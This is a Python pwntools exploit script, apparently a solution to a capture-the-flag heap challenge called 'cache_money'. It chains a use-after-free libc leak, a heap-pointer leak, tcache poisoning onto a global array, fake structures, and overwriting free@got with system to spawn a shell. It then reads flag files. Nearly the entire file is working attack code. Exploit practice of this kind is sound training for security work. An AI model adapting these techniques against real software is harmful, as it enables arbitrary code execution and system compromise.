#!/usr/bin/env python3.13
import sys
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

exe = './cache_money_patched'
libc = ELF('./libc.so.6', checksec=False)

REMOTE = '--remote' in sys.argv
if REMOTE:
    io = remote('chal.sunshinectf.games', 26004)
else:
    io = process(exe)

def menu(choice):
    io.sendlineafter(b'>>> ', str(choice).encode())

def open_wallet(name, size):
    menu(1)
    io.sendlineafter(b'Wallet name: ', name)
    io.sendlineafter(b'): ', str(size).encode())

def deposit(idx, data):
    menu(2)
    io.sendlineafter(b'): ', str(idx).encode())
    io.recvuntil(b'Enter transaction data: ')
    io.send(data)                       # raw read(), send exactly len(data)==size

def withdraw(idx):
    menu(3)
    io.sendlineafter(b'): ', str(idx).encode())
    io.recvuntil(b'):\n    ')
    return io  # caller reads

def transfer(src, dst):
    menu(4)
    io.sendlineafter(b'FROM which wallet? (0-15): ', str(src).encode())
    io.sendlineafter(b'TO which wallet? (0-15): ', str(dst).encode())

def close(idx):
    menu(5)
    io.sendlineafter(b'): ', str(idx).encode())

# ---------- Phase B: libc leak via unsorted bin (chunk 0x110) ----------
BIG = 0x100
# open 9 big wallets, slots 0..8
for i in range(9):
    open_wallet(b'big%d' % i, BIG)
# fill tcache[0x110] with 7 by closing wallets 0..6
for i in range(7):
    close(i)
# transfer 7 -> 8: frees ledger of 7 (tcache full -> unsorted), 8 gets dangling ptr
transfer(7, 8)
# withdraw 8 -> dump unsorted chunk (fd/bk = main_arena)
menu(3)
io.sendlineafter(b'): ', b'8')
io.recvuntil(b'):\n    ')
data = io.recv(16)
fd = u64(data[:8])
libc.address = fd - 0x203b20
log.info('unsorted fd leak: %#x  -> libc base %#x', fd, libc.address)
assert libc.address & 0xfff == 0, 'bad libc base'
system = libc.sym['system']
log.info('system: %#x', system)

# ---------- Phase C heap leak + tcache poison (chunk 0x90, size 0x80) ----------
SM = 0x80
# open A,B,X,Y  (fresh slots). slots currently: 0..6 free(closed), 7 occupied(inactive),
# 8 occupied(active). Open fills lowest free.
open_wallet(b'A', SM)   # slot 0
open_wallet(b'B', SM)   # slot 1
open_wallet(b'X', SM)   # slot 2
open_wallet(b'Y', SM)   # slot 3

# free B first -> tcache[0x90] count1 head=B, B.fd = B>>12 ; Y gets dangling ptr to B
transfer(1, 3)
menu(3); io.sendlineafter(b'): ', b'3'); io.recvuntil(b'):\n    ')
bfd = u64(io.recv(8))
heap_page = bfd << 12
log.info('B>>12 leak: %#x  heap_page=%#x', bfd, heap_page)

# free A second -> tcache count2 head=A, A.fd = B ^ (A>>12) ; X dangling ptr to A
transfer(0, 2)

# overwrite HEAD(A).fd via deposit into X (X.ledger==A). target=array 0x4040c0
ARRAY = 0x4040c0
mangled = ARRAY ^ bfd            # assume A>>12 == B>>12 (same page)
deposit(2, p64(mangled).ljust(SM, b'\x00'))
log.info('mangled fd written: %#x', mangled)

# malloc#1 -> returns A (consumes head). malloc#2 -> returns ARRAY (0x4040c0).
open_wallet(b'C', SM)          # ledger = A
open_wallet(b'W', SM)          # ledger = ARRAY ; memset zeros array; array[k]=W struct
# W is placed in first empty slot. slots occupied so far (nonzero ptrs):
#   7(inactive) 8(active) 0(A) 1(B->now cleared? no, transfer keeps slot) ...
# after transfers slots 0,1 stay occupied(inactive). 2,3 active(X,Y). C -> slot 4. W -> slot 5.
W_SLOT = 5

# Build the wallet-pointer array + two fake structs entirely in .bss.
GOT_FREE = 0x404000
FREE_IDX = 0
BINSH_IDX = 1
FS1 = ARRAY + 0x10   # fake struct that writes system -> free@got
FS2 = ARRAY + 0x40   # fake struct whose ledger -> "/bin/sh"
BINSH = ARRAY + 0x78 # last qword holds "/bin/sh"

arr = [0] * 16
def setq(addr, val):
    arr[(addr - ARRAY)//8] = val
setq(ARRAY + 0x00, FS1)          # array[0] -> FS1
setq(ARRAY + 0x08, FS2)          # array[1] -> FS2
# FS1 at ARRAY+0x10
setq(FS1 + 0x18, GOT_FREE)       # ledger = free@got
setq(FS1 + 0x20, 8)              # size = 8
setq(FS1 + 0x28, 1)              # active
# FS2 at ARRAY+0x40
setq(FS2 + 0x18, BINSH)          # ledger -> "/bin/sh"
setq(FS2 + 0x20, 8)              # size
setq(FS2 + 0x28, 1)              # active
payload = b''.join(p64(x) for x in arr)
payload = payload[:0x78] + b'/bin/sh\x00'
assert len(payload) == 0x80

deposit(W_SLOT, payload)
log.info('array overwritten with fake structs')

# write system into free@got via FS1
deposit(FREE_IDX, p64(system))
log.info('free@got = system')

# trigger: close FS2 -> free(ledger="/bin/sh") == system("/bin/sh")
menu(5)
io.sendlineafter(b'): ', str(BINSH_IDX).encode())

io.sendline(b'echo PWNED; cat flag.txt; cat /flag*; id')
io.interactive()
